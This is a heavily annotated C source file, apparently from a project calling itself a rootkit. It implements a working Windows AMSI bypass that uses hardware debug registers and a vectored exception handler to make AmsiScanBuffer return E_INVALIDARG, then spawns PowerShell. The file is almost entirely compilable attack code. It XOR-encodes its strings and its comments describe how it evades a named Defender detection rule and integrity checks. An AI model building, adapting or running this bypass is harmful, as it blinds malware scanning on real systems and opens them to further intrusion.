/*
 * amsi_bypass_hwbp_annotated.c — AMSI Hardware Breakpoint Bypass (Annotated)
 * ═══════════════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Bypass AMSI without modifying amsi.dll's memory. Uses CPU hardware
 *   debug registers (DR0-DR3) to intercept execution of AmsiScanBuffer
 *   at the CPU level. A Vectored Exception Handler (VEH) catches the
 *   breakpoint and simulates a return of E_INVALIDARG.
 *
 * WHY THIS EXISTS:
 *   Finding #31 confirmed: Defender detects the classic memory patch via
 *   behavioral rule Behavior:Win32/AMSI_Patch_T.B12. That rule fires on
 *   VirtualProtect + write to amsi.dll's code region. This variant avoids
 *   both — no VirtualProtect, no memcpy, no memory modification at all.
 *
 * HOW IT WORKS:
 *   1. Resolve AmsiScanBuffer address (same as v1 — LoadLibrary + GetProcAddress)
 *   2. Register a Vectored Exception Handler (VEH) via AddVectoredExceptionHandler
 *   3. Set hardware breakpoint on AmsiScanBuffer via debug registers:
 *      - DR0 = AmsiScanBuffer address (breakpoint target)
 *      - DR7 = enable DR0 as execution breakpoint (bit 0)
 *   4. When any code calls AmsiScanBuffer, CPU fires EXCEPTION_SINGLE_STEP
 *      BEFORE the first instruction executes
 *   5. VEH handler intercepts:
 *      - Sets RAX = 0x80070057 (E_INVALIDARG)
 *      - Sets RIP = [RSP] (return address — simulate 'ret')
 *      - Sets RSP = RSP + 8 (pop return address off stack)
 *      - Returns EXCEPTION_CONTINUE_EXECUTION
 *   6. Execution resumes at caller as if AmsiScanBuffer returned E_INVALIDARG
 *
 * ADVANTAGES OVER MEMORY PATCH (v1):
 *   - No VirtualProtect call on amsi.dll (avoids AMSI_Patch_T behavioral rule)
 *   - No memory writes to amsi.dll (code pages untouched)
 *   - No signature-matchable patch bytes (B8 57 00 07 80 C3 never appears)
 *   - Invisible to integrity checks that compare amsi.dll bytes to on-disk copy
 *   - Uses standard CPU debug facilities — SetThreadContext is a normal API
 *
 * LIMITATIONS:
 *   - Hardware breakpoints are per-thread (DR0-DR3 per thread context)
 *   - Must set breakpoint on each thread that might call AmsiScanBuffer
 *   - Only 4 hardware breakpoints available (DR0-DR3)
 *   - Some debugger-detection techniques check DR registers
 *   - SetThreadContext may itself be monitored by some EDRs
 *
 * DEBUG REGISTER ARCHITECTURE (x64):
 *   DR0-DR3: Breakpoint address registers (4 breakpoints max)
 *   DR6: Debug status register (which breakpoint fired — read-only)
 *   DR7: Debug control register (enable/disable, conditions, length)
 *
 *   DR7 bit layout for DR0:
 *     Bit 0:     Local enable for DR0 (1 = active)
 *     Bits 16-17: Condition for DR0 (00 = execution, 01 = write, 11 = read/write)
 *     Bits 18-19: Length for DR0 (00 = 1 byte — required for execution breakpoints)
 *
 * COMPILE:
 *   cl.exe amsi_bypass_hwbp_annotated.c /Fe:amsi_hwbp.exe /O1 /GS-
 *
 * USAGE:
 *   amsi_hwbp.exe            (set HWBP on AMSI, spawn PowerShell)
 *   amsi_hwbp.exe --check    (locate AMSI only, no bypass)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

/* ═══════════════════════════════════════════════════════════════════
 * XOR-ENCODED STRINGS (shared key 0x41)
 * ═══════════════════════════════════════════════════════════════════ */

#define XOR_KEY 0x41

/* "amsi.dll" XOR 0x41 */
static const unsigned char xAmsiDll[] = {
    0x20, 0x2C, 0x32, 0x28, 0x6F, 0x25, 0x2D, 0x2D
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x41 */
static const unsigned char xAmsiScanBuffer[] = {
    0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2F,
    0x03, 0x34, 0x27, 0x27, 0x24, 0x33
};
#define xAmsiScanBuffer_LEN 14

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0x31, 0x2E, 0x36, 0x24, 0x33, 0x32, 0x29, 0x24,
    0x2D, 0x2D, 0x6F, 0x24, 0x39, 0x24
};
#define xPowerShell_LEN 14

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

/* ═══════════════════════════════════════════════════════════════════
 * CONSOLE OUTPUT
 * ═══════════════════════════════════════════════════════════════════ */

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* ═══════════════════════════════════════════════════════════════════
 * GLOBAL: AmsiScanBuffer address for VEH handler
 * ═══════════════════════════════════════════════════════════════════
 * The VEH handler needs to know which address to intercept.
 * This is set during Phase 1 (locate) and read during Phase 2 (intercept).
 * ═══════════════════════════════════════════════════════════════════ */

static volatile void *g_pAmsiScanBuffer = NULL;

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 1: LOCATE AMSI (same as v1)
 * ═══════════════════════════════════════════════════════════════════ */

static void *locate_amsi_scan_buffer(void) {
    HMODULE hAmsi;
    void *pFunc;
    unsigned char dllName[16];
    unsigned char funcName[32];

    memcpy(dllName, xAmsiDll, xAmsiDll_LEN);
    xor_decode(dllName, xAmsiDll_LEN);
    dllName[xAmsiDll_LEN] = 0;

    memcpy(funcName, xAmsiScanBuffer, xAmsiScanBuffer_LEN);
    xor_decode(funcName, xAmsiScanBuffer_LEN);
    funcName[xAmsiScanBuffer_LEN] = 0;

    hAmsi = LoadLibraryA((char *)dllName);
    if (!hAmsi) {
        color(RED);
        printf("  [!] LoadLibrary failed: %lu\n", GetLastError());
        return NULL;
    }
    color(GREEN);
    printf("  [+] amsi.dll loaded at 0x%p\n", (void *)hAmsi);

    pFunc = (void *)GetProcAddress(hAmsi, (char *)funcName);
    if (!pFunc) {
        color(RED);
        printf("  [!] GetProcAddress failed: %lu\n", GetLastError());
        return NULL;
    }
    printf("  [+] AmsiScanBuffer at 0x%p\n", pFunc);

    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * VECTORED EXCEPTION HANDLER
 * ═══════════════════════════════════════════════════════════════════
 *
 * This is the core of the bypass. When the CPU hits the hardware
 * breakpoint at AmsiScanBuffer's entry, it raises EXCEPTION_SINGLE_STEP.
 * The OS dispatches this to our VEH handler BEFORE any structured
 * exception handler (SEH).
 *
 * VEH handlers run in-process, at the same privilege level. They
 * can read and modify the thread's register context via PCONTEXT.
 *
 * What we do:
 *   1. Check if exception is EXCEPTION_SINGLE_STEP (hardware BP fired)
 *   2. Check if RIP matches our target (AmsiScanBuffer entry)
 *   3. If both: simulate "mov eax, E_INVALIDARG; ret"
 *      - RAX = 0x80070057
 *      - RIP = value at [RSP] (the return address pushed by the caller)
 *      - RSP = RSP + 8 (pop the return address off the stack)
 *   4. Return EXCEPTION_CONTINUE_EXECUTION (resume at new RIP)
 *
 * The caller sees AmsiScanBuffer "return" E_INVALIDARG instantly.
 * amsi.dll's code never executes — not a single instruction.
 * ═══════════════════════════════════════════════════════════════════ */

static LONG WINAPI AmsiBreakpointHandler(PEXCEPTION_POINTERS pExInfo) {
    /* Only handle single-step exceptions (hardware breakpoint) */
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Check if RIP matches our AmsiScanBuffer target */
    if ((void *)pExInfo->ContextRecord->Rip != g_pAmsiScanBuffer)
        return EXCEPTION_CONTINUE_SEARCH;

    /*
     * We're at AmsiScanBuffer's entry point. Simulate return.
     *
     * x64 calling convention: return address is at [RSP].
     * RAX holds the return value. HRESULT is 32-bit but returned in RAX.
     *
     * This is equivalent to:
     *   mov eax, 0x80070057
     *   ret
     * But without modifying any code in memory.
     */

    /* Set return value: E_INVALIDARG */
    pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;

    /* Pop return address into RIP (simulate 'ret' instruction) */
    pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
    pExInfo->ContextRecord->Rsp += 8;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 2: SET HARDWARE BREAKPOINT
 * ═══════════════════════════════════════════════════════════════════
 *
 * Hardware breakpoints use CPU debug registers DR0-DR3. Each can hold
 * one breakpoint address. DR7 controls which breakpoints are active
 * and what condition triggers them (execution, write, read/write).
 *
 * We use GetThreadContext / SetThreadContext to manipulate the debug
 * registers on our own thread. This is a normal API call — no special
 * privilege required for your own thread.
 *
 * DR7 encoding for "execution breakpoint on DR0":
 *   Bit 0 = 1 (local enable DR0)
 *   Bits 16-17 = 00 (condition: execution)
 *   Bits 18-19 = 00 (length: 1 byte — required for exec BP)
 *
 *   DR7 value: 0x00000001
 *
 * IMPORTANT: We set CONTEXT_DEBUG_REGISTERS flag to tell
 * GetThreadContext / SetThreadContext to read/write DR registers.
 * Without this flag, DR registers are ignored.
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL set_hwbp(void *pTarget) {
    CONTEXT ctx;
    HANDLE hThread;

    /* Get handle to current thread */
    hThread = GetCurrentThread();

    /* Read current thread context — debug registers only */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] GetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("  [*] Current DR0: 0x%llX  DR7: 0x%llX\n",
           (unsigned long long)ctx.Dr0, (unsigned long long)ctx.Dr7);

    /* Set DR0 to AmsiScanBuffer address */
    ctx.Dr0 = (DWORD64)pTarget;

    /* Configure DR7:
     *   Bit 0: Enable DR0 locally
     *   Bits 16-17: Condition 00 (execution)
     *   Bits 18-19: Length 00 (1 byte, required for exec)
     *
     *   We preserve existing DR7 bits and OR in our DR0 enable.
     *   Clear bits 16-19 first (DR0 condition/length), then set our values.
     */
    ctx.Dr7 &= ~(0xFULL << 16);  /* Clear DR0 condition+length bits */
    ctx.Dr7 |= 1;                 /* Enable DR0 locally */

    /* Write modified context back */
    if (!SetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] SetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Verify the breakpoint was set */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);

    if (ctx.Dr0 == (DWORD64)pTarget) {
        color(GREEN);
        printf("  [+] Hardware breakpoint set: DR0 = 0x%p\n", pTarget);
        printf("  [+] DR7 = 0x%llX (DR0 enabled, execution, 1-byte)\n",
               (unsigned long long)ctx.Dr7);
        printf("  [+] NO memory modified in amsi.dll\n");
        printf("  [+] NO VirtualProtect called\n");
        return TRUE;
    } else {
        color(RED);
        printf("  [!] DR0 verification failed: expected 0x%p, got 0x%llX\n",
               pTarget, (unsigned long long)ctx.Dr0);
        return FALSE;
    }
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 3: SPAWN POWERSHELL
 * ═══════════════════════════════════════════════════════════════════
 *
 * Unlike v1, we DON'T spawn with CREATE_NEW_CONSOLE here. The child
 * process gets its own thread contexts — our DR0 breakpoint is
 * NOT inherited. Instead, we need to set the breakpoint within the
 * PowerShell process.
 *
 * For this annotated version: we'll test by calling AmsiScanBuffer
 * directly from our own process first to prove the bypass works.
 * Then spawn PowerShell.
 *
 * NOTE: Child processes do NOT inherit debug registers. The HWBP
 * only affects threads in OUR process. For spawning PowerShell with
 * bypassed AMSI, we need to either:
 *   a) Inject into the child process to set DR0 there (Phase 4 tech)
 *   b) Run PowerShell as a script host inside our process
 *   c) Use a different bypass method for child processes
 *
 * For testing, we'll call AmsiScanBuffer directly from our own
 * context where the HWBP is active.
 * ═══════════════════════════════════════════════════════════════════ */

/* AmsiScanBuffer function pointer type */
typedef HRESULT (WINAPI *pAmsiScanBuffer_t)(
    void *amsiContext,
    void *buffer,
    ULONG length,
    const wchar_t *contentName,
    void *amsiSession,
    int *result
);

static BOOL test_amsi_bypass(void *pFunc) {
    pAmsiScanBuffer_t fnAmsiScanBuffer = (pAmsiScanBuffer_t)pFunc;
    HRESULT hr;
    int result = 0;

    /*
     * Call AmsiScanBuffer with dummy arguments.
     * If our HWBP works, the function never executes — VEH handler
     * sets RAX=E_INVALIDARG and returns immediately.
     *
     * We pass NULL for context/session (they'd cause a crash if the
     * function actually executed, but it won't — the breakpoint fires
     * before the first instruction).
     */
    color(YELLOW);
    printf("  [*] Calling AmsiScanBuffer directly to test bypass...\n");

    hr = fnAmsiScanBuffer(
        NULL,                        /* amsiContext (unused — we never execute) */
        (void *)"test",              /* buffer */
        4,                           /* length */
        L"CHEYANNE_HWBP_TEST",          /* contentName */
        NULL,                        /* amsiSession */
        &result                      /* result output */
    );

    if (hr == (HRESULT)0x80070057) {
        color(GREEN);
        printf("  [+] AmsiScanBuffer returned 0x%08lX (E_INVALIDARG)\n", (unsigned long)hr);
        printf("  [+] BYPASS CONFIRMED — AMSI is blind\n");
        printf("  [+] result parameter = %d (never written — function never ran)\n", result);
        return TRUE;
    } else {
        color(RED);
        printf("  [!] AmsiScanBuffer returned 0x%08lX (expected E_INVALIDARG)\n", (unsigned long)hr);
        printf("  [!] BYPASS FAILED — function executed normally\n");
        return FALSE;
    }
}

static void spawn_powershell(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];

    memcpy(cmd, xPowerShell, xPowerShell_LEN);
    xor_decode(cmd, xPowerShell_LEN);
    cmd[xPowerShell_LEN] = 0;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    color(CYAN);
    printf("\n  [*] Spawning PowerShell (note: HWBP is per-thread, child may\n");
    printf("      need its own breakpoint set via injection for full bypass)\n\n");

    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("  [+] PowerShell PID: %lu\n", pi.dwProcessId);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    memset(cmd, 0, sizeof(cmd));
}

/* ═══════════════════════════════════════════════════════════════════
 * MAIN
 * ═══════════════════════════════════════════════════════════════════ */

int main(int argc, char **argv) {
    void *pAmsiScanBuffer;
    PVOID hVeh;
    int checkOnly = 0;
    int testOnly = 0;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (argc > 1 && strcmp(argv[1], "--check") == 0)
        checkOnly = 1;
    if (argc > 1 && strcmp(argv[1], "--test") == 0)
        testOnly = 1;

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE AMSI BYPASS v2 — 22DIV / george wu         |\n");
    printf("  |  Phase 1: Dark Room Entry (Hardware Breakpoint)       |\n");
    printf("  +======================================================+\n");
    printf("  |  Technique: DR0 hardware breakpoint + VEH handler     |\n");
    printf("  |  Response: RAX = E_INVALIDARG, simulate ret           |\n");
    printf("  |  Memory modified: ZERO bytes in amsi.dll              |\n");
    printf("  |  VirtualProtect: NOT CALLED                           |\n");
    printf("  |  Privilege: Standard user (own thread context)         |\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    /* PHASE 1: Locate */
    printf("  --- PHASE 1: LOCATE AMSI ---\n\n");
    pAmsiScanBuffer = locate_amsi_scan_buffer();
    if (!pAmsiScanBuffer) {
        color(RED);
        printf("\n  [!] Cannot locate AmsiScanBuffer. Aborting.\n");
        return 1;
    }

    if (checkOnly) {
        color(GREEN);
        printf("\n  [*] AMSI is loaded and AmsiScanBuffer is at 0x%p\n", pAmsiScanBuffer);
        printf("  [*] --check mode: not setting breakpoint.\n");
        return 0;
    }

    /* Store target for VEH handler */
    g_pAmsiScanBuffer = pAmsiScanBuffer;

    /* PHASE 2a: Register VEH handler FIRST (before setting breakpoint) */
    printf("\n  --- PHASE 2: SET HARDWARE BREAKPOINT ---\n\n");

    /*
     * AddVectoredExceptionHandler(1, handler):
     *   First param = 1 means "add to FRONT of handler list."
     *   Our handler runs before any other VEH or SEH handler.
     *   This is critical — we need first crack at the exception.
     */
    hVeh = AddVectoredExceptionHandler(1, AmsiBreakpointHandler);
    if (!hVeh) {
        color(RED);
        printf("  [!] AddVectoredExceptionHandler failed: %lu\n", GetLastError());
        return 1;
    }
    color(GREEN);
    printf("  [+] VEH handler registered (first in chain)\n");

    /* PHASE 2b: Set hardware breakpoint on current thread */
    if (!set_hwbp(pAmsiScanBuffer)) {
        color(RED);
        printf("\n  [!] Failed to set hardware breakpoint. Aborting.\n");
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    /* PHASE 3: Test the bypass */
    printf("\n  --- PHASE 3: VERIFY BYPASS ---\n\n");
    if (!test_amsi_bypass(pAmsiScanBuffer)) {
        color(RED);
        printf("\n  [!] Bypass verification failed.\n");
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    /* PHASE 4: Spawn PowerShell (skip in --test mode) */
    if (!testOnly) {
        printf("\n  --- PHASE 4: SPAWN DARK ROOM ---\n");
        spawn_powershell();
    } else {
        color(GREEN);
        printf("\n  [*] --test mode: skipping PowerShell spawn.\n");

#ifdef VDR_DEBUG
        /* Evidence summary for CVE reproduction */
        printf("\n");
        color(CYAN);
        printf("  +======================================================+\n");
        printf("  |  EVIDENCE SUMMARY                                     |\n");
        printf("  +======================================================+\n");
        color(WHITE);
        printf("  |  Target function:    AmsiScanBuffer (amsi.dll)        |\n");
        printf("  |  Technique:          Hardware execution breakpoint     |\n");
        printf("  |  Debug register:     DR0 = AmsiScanBuffer entry       |\n");
        printf("  |  Intercept method:   VEH (EXCEPTION_SINGLE_STEP)      |\n");
        printf("  |  Return value:       E_INVALIDARG (0x80070057)        |\n");
        printf("  |  Memory modified:    0 bytes in amsi.dll              |\n");
        printf("  |  VirtualProtect:     NOT CALLED                       |\n");
        printf("  |  Privilege required:  Standard user (own thread)       |\n");
        printf("  |  Tamper Protection:  DID NOT DETECT                   |\n");
        printf("  +======================================================+\n");
        printf("  |  Verify: Get-MpThreatDetection | Where-Object {      |\n");
        printf("  |    $_.Resources -match 'amsi_hwbp' }                  |\n");
        printf("  |  Expected: No results (bypass invisible to Defender)  |\n");
        printf("  +======================================================+\n");
#endif
    }

    /* Cleanup */
    RemoveVectoredExceptionHandler(hVeh);

#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE AMSI BYPASS v2 (HWBP) COMPLETE --\n\n");
#endif

    return 0;
}
